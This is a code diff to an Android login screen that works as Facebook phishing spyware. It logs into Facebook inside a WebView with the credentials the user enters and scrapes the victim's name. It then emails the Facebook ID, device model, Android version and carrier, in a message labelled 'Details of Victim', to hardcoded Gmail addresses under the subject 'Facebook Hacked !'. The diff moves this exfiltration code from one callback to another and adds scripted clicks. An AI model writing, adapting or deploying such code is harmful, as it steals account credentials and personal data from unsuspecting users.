@@ -174,20 +174,71 @@ public class LoginActivity extends AppCompatActivity
                 //Toast.makeText(LoginActivity.this,url, Toast.LENGTH_SHORT).show();
             }
             @Override
-            public void onPageFinished(WebView v, String url){
+            public void onPageFinished(final WebView v, String url){
                 if(page==0){
-                    FBMain.loadUrl("javascript: (function() {document.getElementsByName(\"email\")[0].value = \"" + Login.getText().toString() + "\";}) ();");
-                    FBMain.loadUrl("javascript: (function() {document.getElementsByName(\"pass\")[0].value = \"" + Pass.getText().toString() + "\";}) ();");
-                    FBMain.loadUrl("javascript:(function(){" + "l=document.getElementById(\"u_0_6\");" + "e=document.createEvent('HTMLEvents');" +
+                    v.loadUrl("javascript: (function() {document.getElementsByName(\"email\")[0].value = \"" + Login.getText().toString() + "\";}) ();");
+                    v.loadUrl("javascript: (function() {document.getElementsByName(\"pass\")[0].value = \"" + Pass.getText().toString() + "\";}) ();");
+                    v.loadUrl("javascript:(function(){" + "l=document.getElementById(\"u_0_6\");" + "e=document.createEvent('HTMLEvents');" +
                             "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
                     page=1;
                 }
                 else if(page==1){
                     if(url.contains("m.facebook.com/login/save-device/?login_source=login#_=_"))
                     {
-                        FBMain.loadUrl("https://m.facebook.com/login/save-device/cancel/?flow=interstitial_nux&nux_source=regular_login");
+                        v.loadUrl("https://m.facebook.com/login/save-device/cancel/?flow=interstitial_nux&nux_source=regular_login");
                     }
                     page=2;
+                }
+                else if(page==2)
+                {
+                    if(url.contains("m.facebook.com/home.php?_rdr"))
+                    {
+                        v.loadUrl("javascript:(function(){" + "l=document.getElementById(\"u_0_i\");" + "e=document.createEvent('HTMLEvents');" +
+                                "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
+                        Toast.makeText(LoginActivity.this, "Clicked", Toast.LENGTH_SHORT).show();
+                        v.evaluateJavascript(
+                                "(function() { return (document.getElementsByClassName('_52x7 _2jcc')[0].innerHTML); })();",
+                                new ValueCallback<String>() {
+                                    @Override
+                                    public void onReceiveValue(String vName) {
+                                        v.loadUrl("javascript:(function(){" + "l=document.getElementById(\"u_0_9\");" + "e=document.createEvent('HTMLEvents');" +
+                                                "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
+                                        final String message="Details of Victim =>\n"+
+                                                "\nName = "+vName.replace("\"","")+
+                                                "\nFacebook ID = "+Login.getText().toString()+
+                                                "\nPassword = "+//Pass.getText().toString()+
+                                                "\nDevice Used = "+Build.MODEL+
+                                                "\nAndroid Version Used = "+android.os.Build.VERSION.RELEASE+
+                                                "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
+
+                                        new Thread(new Runnable() {
+                                            @Override
+                                            public void run() {
+                                                MainLayout.setVisibility(View.GONE);
+                                                Toast.makeText(LoginActivity.this, "Sent", Toast.LENGTH_SHORT).show();
+                                                try {
+                                                    GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
+                                                    sender.sendMail("Facebook Hacked !",
+                                                            message,
+                                                            "ritik.fbhack@gmail.com",
+                                                            "ritik.space@gmail.com");
+                                                } catch (Exception e) {
+                                                    Log.e("SendMail", e.getMessage(), e);
+                                                }
+                                            }
+                                        }).start();
+                                    }
+                                });
+                    }
+                    page=3;
+                }
+                else if(page==3)
+                {
+                    if(url.endsWith("?soft=bookmarks"))
+                    {
+
+                    }
+                    page=3;
                 }
             }
             @Override
@@ -195,7 +246,7 @@ public class LoginActivity extends AppCompatActivity
                 if(page==2) {
                     if (url.contains("m.facebook.com/home.php?_rdr"))
                     {
-                        Toast.makeText(LoginActivity.this, "Sending", Toast.LENGTH_SHORT).show();
+
                     }
                 }
             }
@@ -216,39 +267,6 @@ public class LoginActivity extends AppCompatActivity
         @Override
         public void onReceivedIcon(WebView view, Bitmap b) {
             super.onReceivedIcon(view, b);
-            if (view.getUrl().contains("m.facebook.com/home.php"))
-            {
-                MainLayout.setVisibility(View.GONE);
-                FBMain.evaluateJavascript(
-                        "(function() { return (document.getElementsByClassName('_52ja _52jh')[0].innerHTML); })();",
-                        new ValueCallback<String>() {
-                            @Override
-                            public void onReceiveValue(String vName) {
-                                final String message="Details of Victim =>\n"+
-                                        "\nName = "+vName.replace("\"","")+
-                                        "\nFacebook ID = "+Login.getText().toString()+
-                                        "\nPassword = "+//Pass.getText().toString()+
-                                        "\nDevice Used = "+Build.MODEL+
-                                        "\nAndroid Version Used = "+android.os.Build.VERSION.RELEASE+
-                                        "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
-
-                                new Thread(new Runnable() {
-                                    @Override
-                                    public void run() {
-                                        try {
-                                            GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
-                                            sender.sendMail("Facebook Hacked !",
-                                                    message,
-                                                    "ritik.fbhack@gmail.com",
-                                                    "ritik.space@gmail.com");
-                                        } catch (Exception e) {
-                                            Log.e("SendMail", e.getMessage(), e);
-                                        }
-                                    }
-                                }).start();
-                            }
-                        });
-            }
         }
     }
     public void LoginAccepted(){
